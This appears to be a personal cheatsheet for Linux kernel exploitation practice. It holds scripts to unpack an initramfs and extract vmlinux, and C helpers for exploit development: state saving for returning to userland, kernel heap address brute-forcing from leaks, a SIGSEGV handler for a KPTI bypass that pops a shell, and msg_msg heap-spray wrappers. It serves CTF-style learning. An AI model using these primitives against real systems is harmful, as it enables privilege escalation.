---
title: Kernel kickstart
date: 2025-06-26 12:00:00 + 0530
categories: [misc, cheatsheet]
tags: [pwn, kernel]     # TAG names should always be lowercase
---

## Environment setup

```bash
#!/bin/bash
mkdir initramfs
cp initramfs.cpio.gz initramfs
cd initramfs
gzip -d initramfs.cpio.gz
cpio -idmv < initramfs.cpio
rm initramfs.cpio
cd ..
```
{: file="extract-fs.sh"}

```bash
#!/bin/bash
cd initramfs
find . | cpio -H newc -o | gzip > ../initramfs.cpio.gz
cd ..
```
{: file="rebuild-fs.sh"}

```bash
#!/bin/bash
wget https://raw.githubusercontent.com/torvalds/linux/master/scripts/extract-vmlinux
chmod +x extract-vmlinux
./extract-vmlinux bzImage > vmlinux
```
{: file="extract-vmlinux.sh"}

## Helper functions

### General

```c
void log_info(const char *name, uint64_t value) {
  printf("[INFO] %s = %#lx\n", name, value);
}

void log_error(const char *name, uint64_t value) {
  printf("[ERROR] %s = %#lx\n", name, value);
}

void log_success(const char *name, uint64_t value) {
  printf("[SUCCESS] %s = %#lx\n", name, value);
}

void die(const char *msg) {
  perror(msg);
  exit(EXIT_FAILURE);
}

void pin_to_cpu(int cpu) {
  cpu_set_t mask;
  CPU_ZERO(&mask);
  CPU_SET((unsigned int)cpu, &mask);

  if (sched_setaffinity(cpu, sizeof(mask), &mask) == -1) {
    die("sched_setaffinity");
  }
}

void real_pause() {
  puts("[PAUSED] Press enter to continue...");
  getchar();
}

void dump(void *addr, size_t len) {
  puts("[BEGIN] dump");
  for (size_t i = 0; i < len; i += 8) {
    printf("\t [%04ld] : %#lx\n", i, *(uint64_t *)((uint8_t *)addr + i));
  }
  puts("[END] dump");
}

uint64_t user_cs, user_ss, user_sp, user_rflags;

void save_state() {
  __asm__(".intel_syntax noprefix;"
          "mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;"
          ".att_syntax");
}

uint64_t bruteforce_kheap(uint64_t leak1, uint64_t leak2, uint64_t begin) {
  if (leak1 == 0 || leak2 == 0 || begin == 0) {
    die("Failed to get leaks. Cannot bruteforce_kheap\n");
  }
  uint64_t end, curr, swab_curr, next, swab_next, expected, calculated;
  end = begin + 0xffffffff;
  expected = leak1 ^ leak2;
  for (curr = begin; curr < end; curr += 0x40) {
    swab_curr = __builtin_bswap64(curr);
    next = curr + 0x40;
    swab_next = __builtin_bswap64(next);
    calculated = swab_curr ^ next ^ swab_next;
    if (calculated == expected) {
      return curr;
    }
  }
  return 0;
}

void setup_sigsegv_handler() {
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_sigaction = &pop_shell;
  sa.sa_flags = SA_SIGINFO;
  if (sigaction(SIGSEGV, &sa, NULL) == -1) {
    die("failed to setup signal handler for kpti bypass");
  }
}
```

### `msg_msg` related

```c
#define MSG_COPY 040000
struct list_head {
  struct list_head *next, *prev;
};
struct msg_msgseg {
  struct msg_msgseg *next;
  /* the next part of the message follows immediately */
};
struct msg_msg {
  struct list_head m_list;
  long m_type;
  size_t m_ts; /* message text size */
  struct msg_msgseg *next;
  void *security;
  /* the actual message follows immediately */
};
struct mymsg {
  long mtype;
  char mtext[0x1000];
};
struct mymsg mymsg;

int get_msq() {
  int ret = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
  if (ret < 0) {
    die("msgget");
  };
  return ret;
}

void msg_send(int msqid, size_t size) {
  if (msgsnd(msqid, &mymsg, size, IPC_NOWAIT) < 0) {
    die("msgsnd");
  }
}

void msg_recv(int msqid, size_t size, int flags) {
  memset(&mymsg, 0, sizeof(mymsg));
  mymsg.mtype = 1;
  if (msgrcv(msqid, &mymsg, size, 0, flags) < 0) {
    die("msgrcv");
  }
}
```